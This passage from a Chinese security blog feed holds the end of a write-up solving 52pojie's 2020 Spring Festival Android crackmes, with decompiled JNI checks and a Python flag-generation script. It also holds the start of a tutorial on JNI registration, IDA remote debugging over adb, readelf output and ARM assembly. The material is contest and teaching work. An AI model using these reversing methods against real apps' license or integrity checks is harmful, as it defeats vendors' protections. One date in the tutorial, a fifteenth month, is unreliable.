&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;;                if ( getMethods(env_, &amp;v51, &amp;v44, 0, &quot;java/lang/StringBuilder&quot;, method2) )                  break;              }              t_ = t1;              key1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( key1 )                ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, key1);              ++j;              arr_ = t1;              if ( j &gt;= len__ )                goto LABEL_75;            }</code></pre><p>最后将取字符串字符串的 1~31 位作为新的字符串，并与我们的输入进行比较：</p><pre><code class="cpp">if ( !v42 )          {            method2.name = &quot;toString&quot;;            method2.signature = &quot;()Ljava/lang/String;&quot;;            if ( getMethods(env_, &amp;v51, &amp;v42, 0, &quot;java/lang/StringBuilder&quot;, method2) )              goto LABEL_88;          }          v25 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// convert StringBuilder to string          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v22);          if ( !v25 )            goto LABEL_87;          if ( !v41 )          {            method2.name = &quot;substring&quot;;            method2.signature = &quot;(II)Ljava/lang/String;&quot;;            if ( getMethods(env_, &amp;v49, &amp;v41, 0, &quot;java/lang/String&quot;, method2) )              goto LABEL_88;          }          v55 = 31;                             // slice 1-31          t_ = 1;          v26 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v25);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v25);          if ( !v26 )            goto LABEL_87;          if ( !v40 )          {            method2.name = &quot;equals&quot;;            method2.signature = &quot;(Ljava/lang/Object;)Z&quot;;            if ( getMethods(env_, &amp;v49, &amp;v40, 0, &quot;java/lang/String&quot;, method2) )              goto LABEL_88;          }          t_ = v39;          v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v26);// compare string          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;</code></pre><p>只需要正向地实现就能得到对应的字符串，我这里用 Python 实现了一下：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibkey = &#39;thisiskey52pojie_2020_happy_chinese_new_year20200125&#39;key1 = key[:0x7D-0x74]key2 = key[0x7D-0x74:0xA0-0x74]key3 = key[0xA0-0x74:]arr = &#39;&#39;for i in range(35):    if not i or i &amp; 3:        arr += key2[i]    else:        arr += key3[(i &gt;&gt; 2) - 1]print arrmd5str = hashlib.md5(arr).digest()print md5str.encode(&#39;hex&#39;)xorlist = []for i in range(16):    xorlist.append(ord(key1[i % 9]) ^ ord(md5str[i]))print xorlistflag = &#39;&#39;for i in range(16):    flag += hex(xorlist[i])[2:].zfill(2)print flagflag = flag[1:31]print flagassert len(flag) == 30</code></pre><p>跑出来后在手机上验证一下结果的正确性：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/10.png" srcset="/img/loading.gif" alt></p><p>回复公众号得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/11.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之四"><a href="#【春节】解题领红包之四" class="headerlink" title="【春节】解题领红包之四"></a>【春节】解题领红包之四</h1><p>用 jadx 分析，在 <code>onCreate()</code> 函数中，需要输入 uid 和目标字符串，其中 uid 用 0 补齐成 7 位。然后调用在 Native 层实现的 <code>checkSn()</code> 函数：</p><pre><code class="java">package com.wuaipojie.crackme02;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity {    private Button btn;    private EditText input_flag;    private EditText input_uid;    public native boolean checkSn(String str, String str2);    static {        System.loadLibrary(&quot;xtian&quot;);    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.input_uid = (EditText) findViewById(R.id.input_uid);        this.input_flag = (EditText) findViewById(R.id.input_flag);        Button button = (Button) findViewById(R.id.button);        this.btn = button;        button.setOnClickListener(new OnClickListener() {            public void onClick(View view) {                view = MainActivity.this.input_uid.getText().toString().trim();                if (view.length() &lt; 7) {                    int length = 7 - view.length();                    StringBuilder stringBuilder = new StringBuilder();                    for (int i = 0; i &lt; length; i++) {                        stringBuilder.append(&quot;0&quot;);                    }                    StringBuilder stringBuilder2 = new StringBuilder();                    stringBuilder2.append(stringBuilder.toString());                    stringBuilder2.append(view);                    view = stringBuilder2.toString();                }                MainActivity mainActivity = MainActivity.this;                if (mainActivity.checkSn(view, mainActivity.input_flag.getText().toString().trim()) != null) {                    Toast.makeText(MainActivity.this, &quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;, 0).show();                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;, 0).show();                }            }        });    }}</code></pre><p>把 unicode 输出，可以看到通过了 <code>checkSn</code> 的检测就成功了：</p><pre><code class="ipython">In [1]: print u&quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;正确！！！请把结果直接提交到论坛领取奖励吧In [2]: print u&quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;验证错误，继续加油</code></pre><p>接下来打开 IDA 分析一下 so 文件。没有找到 checkSn 函数，基本上都被混淆了，说明函数是被动态注册的。JNI_OnLoad 的部分：</p><pre><code class="cpp">void __fastcall __noreturn JNI_OnLoad(_JavaVM *vm){  _JavaVM *vm_; // r11  signed int v2; // r2  int v3; // lr  int (__fastcall *v4)(_JavaVM *, int *, signed int); // r4  int v5; // lr  signed int i; // r12  int v7; // [sp+8h] [bp-C0h]  int *v8; // [sp+10h] [bp-B8h]  int v9; // [sp+18h] [bp-B0h]  int v10; // [sp+20h] [bp-A8h]  int v11; // [sp+28h] [bp-A0h]  int v12; // [sp+30h] [bp-98h]  int *v13; // [sp+38h] [bp-90h]  int v14; // [sp+40h] [bp-88h]  signed int v15; // [sp+48h] [bp-80h]  int v16; // [sp+50h] [bp-78h]  int *v17; // [sp+7Ch] [bp-4Ch]  void *v18; // [sp+80h] [bp-48h]  int *v19; // [sp+84h] [bp-44h]  int *v20; // [sp+88h] [bp-40h]  int *v21; // [sp+8Ch] [bp-3Ch]  int *v22; // [sp+90h] [bp-38h]  int *v23; // [sp+94h] [bp-34h]  int *v24; // [sp+98h] [bp-30h]  void **v25; // [sp+9Ch] [bp-2Ch]  signed int *v26; // [sp+A0h] [bp-28h]  vm_ = vm;  v23 = &amp;Oo0O_8;  v24 = &amp;O0OO_9;  v18 = &amp;_stack_chk_guard;  v2 = 0;  if ( O0OO_9 &lt; 10 )    v2 = 1;  v3 = v2 | ~((Oo0O_8 - 1) * Oo0O_8) &amp; 1;  if ( v3 != 1 )    goto LABEL_5;  while ( 1 )  {    v26 = &amp;v15;    v15 = 0x58D3C185;    v12 = 0x58D3C185;    v13 = &amp;v10;    if ( v3 )    {      v22 = &amp;v11;      v17 = (int *)&amp;v13;      v20 = &amp;v16;      v21 = &amp;v12;      v4 = (int (__fastcall *)(_JavaVM *, int *, signed int))(*((_DWORD *)off_1D7B0 + 0x1FEC2733) - 0x58D3C184);      v14 = v4(vm, &amp;v10, 0x10004);      v5 = *v23;      for ( i = *v24; *v24 &gt;= 10 &amp;&amp; ((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1; i = *v24 )      {        v14 = v4(vm_, &amp;v10, 0x10004);        v14 = v4(vm_, &amp;v10, 0x10004);        v5 = *v23;      }      v19 = &amp;v14;      v25 = &amp;off_1D7B0;      if ( i &lt; 10 || !(((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1) )        JUMPOUT(__CS__, *((_DWORD *)off_1D7B4 + 0x1FEC27A2) - 0x49F16B40);      while ( 1 )        ;    }LABEL_5:    v9 = 0x58D3C185;    v8 = &amp;v7;  }}</code></pre><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-732955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-732955-1-1.html</a><br><a href="https://www.52pojie.cn/thread-749955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-749955-1-1.html</a><br><a href="https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example" target="_blank" rel="noopener">https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example</a><br><a href="https://www.52pojie.cn/thread-1101266-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1101266-1-1.html</a><br><a href="https://www.bodkin.ren/index.php/archives/533/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/533/</a><br><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-778654-1-1.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门（二）</title>
    <link href="/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Android JNI 编程及 ARM 汇编入门。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Android Studio 3.5.3</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>Android 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。</p><p><img src="/pics/Android逆向入门/二/1.png" srcset="/img/loading.gif" alt></p><p>如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 <code>log.h</code> 定义几个在 C++ 文件中进行日志输出的函数：</p><pre><code class="cpp">#include &lt;android/log.h&gt;#ifndef LOG_TAG#define LOG_TAG &quot;MY_TAG&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endif</code></pre><p>在 Java 文件中添加日志输出：</p><pre><code class="java">public class MainActivity extends AppCompatActivity {    ...    @Override    protected void onCreate(Bundle savedInstanceState) {        ...        Log.d(&quot;Debug&quot;, &quot;infomation&quot;);    }    ...}</code></pre><p>在需要调用 JNI 的函数中加载动态库：</p><pre><code class="java">public class MainActivity extends AppCompatActivity {    // Used to load the &#39;native-lib&#39; library on application startup.    static {        System.loadLibrary(&quot;native-lib&quot;);    }    ...}</code></pre><h2 id="Native-函数注册"><a href="#Native-函数注册" class="headerlink" title="Native 函数注册"></a>Native 函数注册</h2><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。</p><p>Java 文件中的 Native 声明：</p><pre><code class="java">public native String sayHello();</code></pre><p>静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 <code>JNIEnv* env</code> 和 <code>jclass</code>（static 方法时）/<code>jobject</code>（普通方法时）：</p><pre><code class="cpp">#include &lt;jni.h&gt;#include &lt;string&gt;#include &quot;log.h&quot;extern &quot;C&quot; {JNIEXPORT jstring JNICALLJava_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) {    return env-&gt;NewStringUTF(&quot;Hello World&quot;);}}</code></pre><p>静态注册有一些缺点：</p><ol><li>Native 函数名称特别长，不利于书写；</li><li>每次新增或删除接口时需要重新生成文件，比较繁琐；</li><li>第一次调用时需要根据函数名建立索引，影响效率；</li><li>JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。</li></ol><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><p>动态注册在 JNI 层通过重载 <code>JNI_OnLoad()</code> 函数来实现，系统初始化 JNI 在加载时，会调用 <code>JNI_OnLoad()</code>，而卸载时会调用 <code>JNI_UnLoad()</code>。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。</p><p>cpp 文件中的函数定义如下：</p><pre><code class="cpp">jstring sayHi(JNIEnv *env, jobject obj) {    return env-&gt;NewStringUTF(&quot;Hi World&quot;);}</code></pre><p>通过内置函数 <code>RegisterNatives()</code> 实现自定义的注册方法：</p><pre><code class="cpp">static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) {    jclass clazz;    clazz = env-&gt;FindClass(className);    if (clazz == NULL) {        return JNI_FALSE;    }    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) {        return JNI_FALSE;    }    return JNI_TRUE;}</code></pre><p>定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息：</p><pre><code class="cpp">static const char *gClassName = &quot;com/assassinq/easycpp/MainActivity&quot;;static JNINativeMethod gMethods[] = {        {&quot;sayHi&quot;, &quot;()Ljava/lang/String;&quot;, (void *) sayHi},};</code></pre><p>其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针：</p><pre><code class="cpp">typedef struct {    const char* name; // native 的方法名    const char* signature; // 方法签名，例如 ()Ljava/lang/String;    void*       fnPtr; // 函数指针} JNINativeMethod;</code></pre><p>最后重写 <code>JNI_OnLoad()</code> 函数：</p><pre><code class="cpp">JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {    JNIEnv *env = NULL;    if (vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) != JNI_OK) {        LOGE(&quot;This jni version is not supported&quot;);        return -1;    }    if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) {        LOGE(&quot;Unable to register native methods&quot;);        return -1;    }    LOGE(&quot;Methods loaded successfully&quot;);    return JNI_VERSION_1_6;}</code></pre><h2 id="so-动态链接库"><a href="#so-动态链接库" class="headerlink" title="so 动态链接库"></a>so 动态链接库</h2><p>在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库：</p><pre><code>android {    ...    defaultConfig {        ...        ndk {            abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot;        }    }    ...}</code></pre><p>so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）：</p><ul><li>armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。</li><li>arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。</li><li>armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。</li><li>x86：Intel x86（平板、模拟器用得比较多）。</li><li>x86_64：Intel x64（64 位的平板）。</li><li>…</li></ul><h2 id="IDA-反编译-so-文件"><a href="#IDA-反编译-so-文件" class="headerlink" title="IDA 反编译 so 文件"></a>IDA 反编译 so 文件</h2><p>用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so：</p><p><img src="/pics/Android逆向入门/二/2.png" srcset="/img/loading.gif" alt></p><p>查看静态注册函数的反编译结果：</p><pre><code class="cpp">int __fastcall Java_com_assassinq_easycpp_MainActivity_sayHello(_JNIEnv *a1){  return _JNIEnv::NewStringUTF(a1, &quot;Hello World&quot;);}</code></pre><p>查看动态注册的函数的反编译结果：</p><pre><code class="cpp">int __fastcall sayHi(_JNIEnv *a1){  return _JNIEnv::NewStringUTF(a1, &quot;Hi World&quot;);}</code></pre><h1 id="IDA-动态调试-apk"><a href="#IDA-动态调试-apk" class="headerlink" title="IDA 动态调试 apk"></a>IDA 动态调试 apk</h1><ol><li>安装 apk 到手机：<code>adb install example.apk</code></li><li>将 IDA 目录下的调试文件 push 到手机上：<code>adb push android_server /data/local/tmp</code></li><li>赋给程序可执行权限：<code>chmod 777 android_server</code></li><li>启动调试服务端：<code>./android_server</code> （自定义设置端口方式：<code>-p23333</code>）</li><li>手机端端口转发至电脑端：<code>adb forward tcp:[pc_port] tcp:[mobile_port]</code></li><li>IDA 调试端口设置：Debugger-&gt;Process option</li><li>在 Debugger setup 中勾选 Suspend on process entry point、Suspend on thread start/exit 以及 Suspend on library load/unload</li><li>启动程序：<code>adb shell am start -D -n packageName/activityName</code></li><li>IDA 挂接到 Native 层：Debugger-&gt;Attach to process…</li><li>打开 monitor，监听并挂接到 JAVA 层：<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></li></ol><p><img src="/pics/Android逆向入门/二/3.png" srcset="/img/loading.gif" alt></p><p>PS：如果在 monitor 中没有找到对应的进程，检查一下调试的程序中 AndroidManifest.xml 中是否设置了 <code>android:debuggable=&quot;true&quot;</code>（若没有则修改后并重新打包）。</p><h1 id="动态链接库文件（-so-文件）"><a href="#动态链接库文件（-so-文件）" class="headerlink" title="动态链接库文件（.so 文件）"></a>动态链接库文件（.so 文件）</h1><p>加载顺序：</p><pre><code>init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array</code></pre><h2 id="so-文件查看工具"><a href="#so-文件查看工具" class="headerlink" title="so 文件查看工具"></a>so 文件查看工具</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-a</code></td><td style="text-align:center">显示 so 文件的所有信息</td></tr><tr><td style="text-align:center"><code>-h</code></td><td style="text-align:center">显示 ELF 文件头</td></tr><tr><td style="text-align:center"><code>-l</code></td><td style="text-align:center">显示 Program Headers，动态加载时需要的信息</td></tr><tr><td style="text-align:center"><code>-S</code></td><td style="text-align:center">显示 Section Headers，静态加载分析时需要的信息</td></tr><tr><td style="text-align:center"><code>-e</code></td><td style="text-align:center">显示 ELF Header、Section Headers、Program Headers 信息</td></tr><tr><td style="text-align:center"><code>-s</code></td><td style="text-align:center">显示符号表（Symbol Table）</td></tr><tr><td style="text-align:center"><code>-d</code></td><td style="text-align:center">显示动态节区（Dynamic Section）</td></tr></tbody></table><p>显示 ELF 文件头：</p><pre><code class="bash">$ readelf -h libnative-lib.soELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           ARM  Version:                           0x1  Entry point address:               0x0  Start of program headers:          52 (bytes into file)  Start of section headers:          12932 (bytes into file)  Flags:                             0x5000200, Version5 EABI, soft-float ABI  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         8  Size of section headers:           40 (bytes)  Number of section headers:         27  Section header string table index: 26</code></pre><p>显示 Program headers：</p><pre><code class="bash">$ readelf -l libnative-lib.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000  LOAD           0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW  0x1000  DYNAMIC        0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW  0x4  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10  EXIDX          0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R   0x4  GNU_RELRO      0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW  0x4 Section to Segment mapping:  Segment Sections...   00   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata   02     .fini_array .data.rel.ro .dynamic .got .data .bss   03     .dynamic   04     .note.android.ident .note.gnu.build-id   05   06     .ARM.exidx   07     .fini_array .data.rel.ro .dynamic .got</code></pre><p>显示 Section headers：</p><pre><code class="bash">$ readelf -S libnative-lib.soThere are 27 section headers, starting at offset 0x3284:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .note.android.ide NOTE            00000134 000134 000098 00   A  0   0  4  [ 2] .note.gnu.build-i NOTE            000001cc 0001cc 000024 00   A  0   0  4  [ 3] .dynsym           DYNSYM          000001f0 0001f0 000190 10   A  4   1  4  [ 4] .dynstr           STRTAB          00000380 000380 0001d3 00   A  0   0  1  [ 5] .gnu.hash         GNU_HASH        00000554 000554 00004c 04   A  3   0  4  [ 6] .hash             HASH            000005a0 0005a0 0000b0 04   A  3   0  4  [ 7] .gnu.version      VERSYM          00000650 000650 000032 02   A  3   0  2  [ 8] .gnu.version_d    VERDEF          00000684 000684 00001c 00   A  4   1  4  [ 9] .gnu.version_r    VERNEED         000006a0 0006a0 000040 00   A  4   2  4  [10] .rel.dyn          REL             000006e0 0006e0 0000e8 08   A  3   0  4  [11] .rel.plt          REL             000007c8 0007c8 000088 08  AI  3  20  4  [12] .plt              PROGBITS        00000850 000850 0000e0 00  AX  0   0  4  [13] .text             PROGBITS        00000930 000930 0018c4 00  AX  0   0  4  [14] .ARM.exidx        ARM_EXIDX       000021f4 0021f4 0001b8 08  AL 13   0  4  [15] .ARM.extab        PROGBITS        000023ac 0023ac 0001a4 00   A  0   0  4  [16] .rodata           PROGBITS        00002550 002550 000566 01 AMS  0   0  1  [17] .fini_array       FINI_ARRAY      00003e3c 002e3c 000008 04  WA  0   0  4  [18] .data.rel.ro      PROGBITS        00003e44 002e44 000048 00  WA  0   0  4  [19] .dynamic          DYNAMIC         00003e8c 002e8c 000110 08  WA  4   0  4  [20] .got              PROGBITS        00003f9c 002f9c 000064 00  WA  0   0  4  [21] .data             PROGBITS        00004000 003000 000018 00  WA  0   0  4  [22] .bss              NOBITS          00004018 003018 000001 00  WA  0   0  1  [23] .comment          PROGBITS        00000000 003018 000109 01  MS  0   0  1  [24] .note.gnu.gold-ve NOTE            00000000 003124 00001c 00      0   0  4  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 003140 000034 00      0   0  1  [26] .shstrtab         STRTAB          00000000 003174 00010f 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings)  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre><p>显示符号表：</p><pre><code class="bash">$ readelf -s libnative-lib.soSymbol table &#39;.dynsym&#39; contains 25 entries:   Num:    Value  Size Type    Bind   Vis      Ndx Name     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_atexit@LIBC (2)     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_finalize@LIBC (2)     3: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __stack_chk_guard@LIBC (2)     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@LIBC (2)     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __android_log_print     6: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __sF@LIBC (2)     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND abort@LIBC (2)     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@LIBC (2)     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@LIBC (2)    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND dladdr@LIBC (3)    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memclr8    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memcpy    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND __gnu_Unwind_Find_exidx    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND snprintf@LIBC (2)    15: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS _edata    16: 00004019     0 NOTYPE  GLOBAL DEFAULT  ABS _end    17: 00000975    36 FUNC    GLOBAL DEFAULT   13 Java_com_assassinq_easycp    18: 00000999    44 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv12NewStringUTF    19: 00000b87    72 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv15RegisterNati    20: 00000b5d    42 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv9FindClassEPKc    21: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start    22: 000009e9   224 FUNC    GLOBAL DEFAULT   13 JNI_OnLoad    23: 00000ac9    52 FUNC    WEAK   DEFAULT   13 _ZN7_JavaVM6GetEnvEPPvi    24: 000009c5    36 FUNC    GLOBAL DEFAULT   13 sayHi</code></pre><p>显示 Dynamic Section：</p><pre><code class="bash">$ readelf -d libnative-lib.soDynamic section at offset 0x2e8c contains 29 entries:  Tag        Type                         Name/Value 0x00000003 (PLTGOT)                     0x3fb0 0x00000002 (PLTRELSZ)                   136 (bytes) 0x00000017 (JMPREL)                     0x7c8 0x00000014 (PLTREL)                     REL 0x00000011 (REL)                        0x6e0 0x00000012 (RELSZ)                      232 (bytes) 0x00000013 (RELENT)                     8 (bytes) 0x6ffffffa (RELCOUNT)                   26 0x00000006 (SYMTAB)                     0x1f0 0x0000000b (SYMENT)                     16 (bytes) 0x00000005 (STRTAB)                     0x380 0x0000000a (STRSZ)                      467 (bytes) 0x6ffffef5 (GNU_HASH)                   0x554 0x00000004 (HASH)                       0x5a0 0x00000001 (NEEDED)                     Shared library: [liblog.so] 0x00000001 (NEEDED)                     Shared library: [libm.so] 0x00000001 (NEEDED)                     Shared library: [libdl.so] 0x00000001 (NEEDED)                     Shared library: [libc.so] 0x0000000e (SONAME)                     Library soname: [libnative-lib.so] 0x0000001a (FINI_ARRAY)                 0x3e3c 0x0000001c (FINI_ARRAYSZ)               8 (bytes) 0x0000001e (FLAGS)                      BIND_NOW 0x6ffffffb (FLAGS_1)                    Flags: NOW 0x6ffffff0 (VERSYM)                     0x650 0x6ffffffc (VERDEF)                     0x684 0x6ffffffd (VERDEFNUM)                  1 0x6ffffffe (VERNEED)                    0x6a0 0x6fffffff (VERNEEDNUM)                 2 0x00000000 (NULL)                       0x0</code></pre><h3 id="SO-Helper"><a href="#SO-Helper" class="headerlink" title="SO Helper"></a>SO Helper</h3><p>无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。</p><h1 id="ARM-汇编代码"><a href="#ARM-汇编代码" class="headerlink" title="ARM 汇编代码"></a>ARM 汇编代码</h1><p>ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。</p><ol><li>ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通；</li><li>ARM 汇编语言编写的程序运行速度快，占用内存少；</li><li>ARM 编写的代码难懂，难以维护；</li><li>C 语言能实现的 ARM 汇编语言都能实现；</li><li>ARM 具有 31 个通用寄存器，6 个状态寄存器；</li><li>ARM 处理器支持 7 种运行模式。<ol><li>用户模式：ARM 